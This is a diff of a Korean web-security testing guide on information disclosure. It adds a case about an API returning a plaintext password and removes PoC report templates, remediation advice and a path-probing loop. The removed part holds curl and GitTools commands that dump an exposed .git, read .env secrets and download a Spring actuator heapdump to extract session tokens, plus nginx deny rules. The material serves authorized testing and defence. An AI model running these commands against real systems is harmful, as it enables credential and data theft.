@@ -1,13 +1,12 @@
 ---
 sidebar_position: 27
-title: 정보 노출 (Information Disclosure)
+title: 정보 노출
 description: 웹 진단 - 백업 파일, .git, 에러 메시지, 디렉토리 리스팅, 주석 노출, 메타데이터 등 정보 노출 점검
 keywords: [Information Disclosure, 정보노출, .git, backup, debug, error message, directory listing, OWASP A02]
 draft: false
 ---
 
-# 정보 노출 (Information Disclosure)
-
+# 정보 노출
 > 의도하지 않게 노출되는 **소스 코드 / 설정 / 자격증명 / 내부 정보** 점검.
 > 단독으론 Low ~ Medium 이지만, 노출된 정보 (DB 자격증명, API 키, 백업 파일) 가 직접 후속 공격으로 연결되면 즉시 Critical.
 
@@ -108,8 +107,7 @@ HTML 주석, JS 번들, 소스맵, 응답 본문의 과도한 필드 분석.
 
 ## 페이로드 / 테스트 케이스
 
-### 케이스 1: `.git` / `.svn` 노출 (가장 임팩트 큼)
-
+### 케이스 1: `.git` / `.svn` 노출
 **언제 쓰는지**: 모든 사이트에서 첫 단계. `.git/` 폴더가 웹 루트에 노출되면 소스 전체 복원 가능 → Critical.
 
 **확인:**
@@ -333,8 +331,29 @@ HTTP/1.1 200 OK
 
 **판정**: 클라이언트 UI 가 쓰지 않는 민감 필드 (비밀번호 해시, 내부 ID, 신용 정보) 가 응답에 포함되면 결함. 백엔드가 ORM 의 전체 필드를 자동 직렬화 (`User.serialize()`) 한 패턴.
 
-### 케이스 8: 메타데이터 노출 (EXIF / Office)
+#### 회원정보 API의 평문 비밀번호 노출
 
+마이페이지 / 내 정보 API는 로그인한 본인만 보는 기능이라 과소평가되지만, 응답에 평문 비밀번호가 포함되면 별도 고위험 결함으로 본다.
+
+```http
+GET /api/member/me HTTP/1.1
+Host: <TARGET>
+Cookie: SESSION=<USER_SESSION>
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "userId": "user01",
+  "email": "user01@example.com",
+  "role": "USER",
+  "password": "PlainTextPassword123!"
+}
+```
+
+**판정:** `password` 평문이 응답에 포함되면 서버가 비밀번호를 복호화 가능하게 저장하거나 평문 저장 중일 가능성이 높다. 해시(`password_hash`) 노출보다 더 심각하게 보고, 동일 비밀번호 재사용으로 다른 서비스 계정 탈취까지 이어질 수 있다.
+
+### 케이스 8: 메타데이터 노출
 **언제 쓰는지**: 사용자 / 직원이 업로드한 이미지, PDF, Office 파일 다운로드 시.
 
 **확인:**
@@ -344,10 +363,10 @@ HTTP/1.1 200 OK
 exiftool downloaded_image.jpg
 
 # 자주 노출되는 정보:
-# - GPS 좌표 (촬영 위치)
+# - GPS 좌표
 # - 카메라 / 휴대폰 모델
 # - 작성자 / 사용자명
-# - 소프트웨어 버전 (Adobe Photoshop 22.0)
+# - 소프트웨어 버전
 # - 작성 / 수정 시간
 
 # PDF / Office
@@ -435,234 +454,6 @@ curl https://<TARGET>/.well-known/openid-configuration
 - [ ] `/health` 엔드포인트의 단순 OK 응답은 정상 (단, 내부 상태 / 버전 노출 시 결함)
 - [ ] `.well-known/openid-configuration` 은 OIDC 표준
 - [ ] 의도적으로 공개된 API 문서 (Swagger 공식 공개) 는 정책상 정상
-
----
-
-## PoC 양식 (보고서 붙여넣기용)
-
-### PoC 1 — [Information Disclosure] .git 디렉토리 노출로 인한 소스 코드 / 자격증명 탈취
-
-1. `<TARGET>` 의 웹 루트에 `.git/` 폴더가 노출되어 있는지 확인
-2. GitTools (gitdumper.sh) 로 Git 메타데이터 다운로드
-3. extractor.sh 로 커밋 히스토리 복원 → 소스 코드 / 자격증명 추출
-
-**1차 확인:**
-
-```bash
-$ curl -I https://<TARGET>/.git/config
-HTTP/1.1 200 OK
-Content-Type: text/plain
-
-$ curl https://<TARGET>/.git/HEAD
-ref: refs/heads/main
-```
-
-**2차 — Git 복원:**
-
-```bash
-$ gitdumper.sh https://<TARGET>/.git/ ./dump/
-[*] Destination folder does not exist
-[+] Creating ./dump/.git/
-[+] Downloaded: HEAD
-[+] Downloaded: objects/info/packs
-[+] Downloaded: description
-... (수십~수백 파일)
-
-$ extractor.sh ./dump/ ./extracted/
-[+] Found commit: 8a9f...
-[+] Found commit: 3b7e...
-...
-
-$ cd extracted/0-<commit>
-$ ls
-.env  config/  src/  package.json  README.md
-```
-
-**3차 — 자격증명 노출:**
-
-```bash
-$ cat .env
-DB_HOST=prod-db.target.internal
-DB_USER=app_prod
-DB_PASSWORD=Pr0d_DB_S3cret!
-JWT_SECRET=8a3f2b...
-AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
-AWS_SECRET_ACCESS_KEY=wJalrXUt...
-STRIPE_SECRET_KEY=sk_live_...
-```
-
-**확인 사항:**
-- `.git/` 메타데이터가 웹 루트에 노출되어 익명 사용자가 전체 Git 히스토리 다운로드 가능
-- 복원된 소스 코드 + `.env` 파일에서 운영 DB 자격증명 / JWT 시크릿 / AWS 액세스 키 / Stripe 키 노출
-- 운영 DB / 클라우드 / 결제 인프라 직접 침투 가능 → 즉시 Critical
-- 단일 결함만으로 시스템 전체 침해 + 결제 / 클라우드 자원 악용
-
----
-
-### PoC 2 — [Information Disclosure] Spring Boot Actuator /env 노출
-
-1. `<TARGET>` 의 Spring Boot 서비스에 `/actuator/env` 인증 없이 접근
-2. 응답 본문에서 DB 자격증명 / API 키 추출
-3. 추가로 `/actuator/heapdump` 로 메모리 덤프 다운로드 → 세션 토큰 / 비밀번호 추출
-
-**1차 확인:**
-
-```http
-GET /actuator/env HTTP/1.1
-Host: <TARGET>
-
-HTTP/1.1 200 OK
-Content-Type: application/json
-
-{
-  "activeProfiles": ["prod"],
-  "propertySources": [
-    {
-      "name": "applicationConfig: [classpath:/application.yml]",
-      "properties": {
-        "spring.datasource.url": {
-          "value": "jdbc:mysql://db.internal:3306/app"
-        },
-        "spring.datasource.username": {"value": "app_prod"},
-        "spring.datasource.password": {"value": "Pr0d_S3cret!"},
-        "jwt.secret": {"value": "supersecretkey..."},
-        "stripe.api.key": {"value": "sk_live_..."}
-      }
-    }
-  ]
-}
-```
-
-**2차 — Heap Dump 다운로드:**
-
-```bash
-$ curl -o heap.hprof https://<TARGET>/actuator/heapdump
-
-$ jhat heap.hprof   # 또는 Eclipse MAT 로 분석
-# 메모리에서 세션 토큰 / Authorization 헤더 / 비밀번호 string 추출
-```
-
-**확인 사항:**
-- `/actuator/env` 가 인증 없이 응답 → DB 자격증명 / API 키 전체 노출
-- `/actuator/heapdump` 로 JVM 메모리 덤프 다운로드 가능 → 메모리에서 활성 세션 토큰 / 비밀번호 추출 가능
-- Spring Boot 의 actuator 엔드포인트가 기본 노출 + 인증 미적용 패턴
-- 안전 패턴: `management.endpoints.web.exposure.include=health,info` (다른 엔드포인트는 노출 안 함) + actuator 경로 인증 필수
-
----
-
-## 영향도 분석
-
-- **기밀성 (Confidentiality)**: 🔴 — 자격증명 / 소스 / 백업 노출 시 매우 높음
-- **무결성 (Integrity)**: 🟡 — 직접 변조는 없지만, 노출된 자격증명으로 후속 침해
-- **가용성 (Availability)**: 🟢 — 직접 영향 거의 없음
-- **추가 위협**:
-  - **자격증명 → 직접 침투** — DB / 클라우드 / 결제 인프라 즉시 침투
-  - **소스 노출 → 추가 결함 발견** — 클라이언트가 안 쓰는 백엔드 로직 / 인증 우회 패턴 / 디버그 엔드포인트
-  - **메모리 덤프 → 세션 / 비밀번호** — 활성 사용자 세션 탈취
-  - **API 문서 → 공격 표면 매핑** — Swagger 공개로 모든 엔드포인트 / 파라미터 노출
-
-**비즈니스 임팩트:**
-정보 노출은 단독 임팩트는 낮아 보이지만, 노출된 정보가 자격증명 / 소스 코드 / 백업이면 단일 결함으로 시스템 전체 침해로 직결. 점검 시 1차 정찰 단계에서 항상 수행해야 하며, 발견된 정보에 따라 후속 점검 방향이 결정된다.
-
----
-
-## 대응방안
-
-### 개발자 관점 (필수)
-
-1. **VCS / 빌드 메타데이터 웹 루트 제외** — `.git/`, `.svn/`, `.idea/`, `node_modules/`, `.DS_Store` 등 배포 시 제외 + 웹 서버 단에서 차단:
-
-   ```nginx
-   location ~ /\.(git|svn|hg|bzr|idea|vscode) {
-       deny all;
-       return 404;
-   }
-   location = /.DS_Store { return 404; }
-   ```
-
-2. **환경 / 설정 파일 웹 루트 밖 배치** — `.env`, `config.json` 등을 정적 디렉토리 밖에 두고 환경 변수로 로드. 절대 `/public/.env` 같은 배치 금지.
-
-3. **백업 / 임시 파일 정기 정리** — `*.bak`, `*.old`, `*.zip` 자동 검출 / 차단:
-
-   ```nginx
-   location ~* \.(bak|old|orig|save|swp|sql|tar|tar\.gz|zip)$ {
-       deny all;
-       return 404;
-   }
-   ```
-
-4. **운영 환경 디버그 비활성** — Flask `debug=False`, Django `DEBUG=False`, Spring Boot `server.error.include-stacktrace=never`, Express `NODE_ENV=production`.
-
-5. **에러 응답 표준화** — 사용자에겐 일반 메시지 (`내부 오류가 발생했습니다`), 상세는 서버 로그로만:
-
-   ```python
-   # Flask
-   @app.errorhandler(Exception)
-   def handle_error(e):
-       app.logger.exception(e)                # 서버 로그에만 상세
-       return jsonify({"error": "internal"}), 500
-   ```
-
-6. **디렉토리 리스팅 비활성**:
-
-   ```nginx
-   autoindex off;                              # nginx (기본 off)
-   ```
-   ```apache
-   Options -Indexes                            # apache
-   ```
-
-7. **API 응답은 명시적 필드만** — DTO / Serializer 로 화이트리스트 (`authorization-idor.md` 의 Mass Assignment 안전 패턴 참조). 절대 `User.serialize()` 로 전체 필드 직렬화 금지.
-
-8. **JS 번들 / 소스맵 운영 배포 제외** — `webpack.config.js` 의 `devtool: false` (운영) 또는 `hidden-source-map` (Sentry 등 내부 분석용만).
-
-9. **EXIF 등 메타데이터 제거** — 이미지 업로드 시 서버 측에서 메타데이터 strip:
-
-   ```python
-   from PIL import Image
-   img = Image.open(uploaded_file)
-   img_clean = Image.new(img.mode, img.size)
-   img_clean.putdata(list(img.getdata()))
-   img_clean.save(output_path)               # EXIF 제거
-   ```
-
-10. **Spring Boot Actuator 노출 제한**:
-
-    ```yaml
-    management:
-      endpoints:
-        web:
-          exposure:
-            include: health, info        # 최소 노출
-            exclude: env, heapdump, threaddump, configprops, beans
-      endpoint:
-        health:
-          show-details: never            # health 도 details 숨김
-    # + Spring Security 로 /actuator/** 인증 필수
-    ```
-
-### 운영자 관점
-
-1. **외부 노출 자산 정기 점검** — `robots.txt`, `sitemap.xml`, 디렉토리 리스팅, 백업 파일 자동 스캔.
-
-2. **CT 로그 모니터링** — 인증서 SAN 으로 내부 도메인이 노출되는지 정기 점검 (`crt.sh`).
-
-3. **HTTP 응답 본문 필드 모니터링** — `password`, `secret`, `api_key` 등 민감 패턴 응답 탐지.
-
-4. **WAF / API Gateway 룰** — `.git/`, `.env`, `/actuator/`, `*.bak` 등 차단 룰.
-
-### 빠른 자가 점검 명령
-
-```bash
-# 핵심 노출 패턴 일괄 점검
-for p in /.env /.git/config /.svn/entries /backup.zip /backup.sql \
-         /web.config /WEB-INF/web.xml /config.json /config.yml \
-         /application.properties /actuator/env /actuator/heapdump \
-         /swagger /v2/api-docs /graphql /server-status; do
-    code=$(curl -s -o /dev/null -w "%{http_code}" https://<TARGET>$p)
-    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "[$code] $p"
-done
-```
 
 ---
 
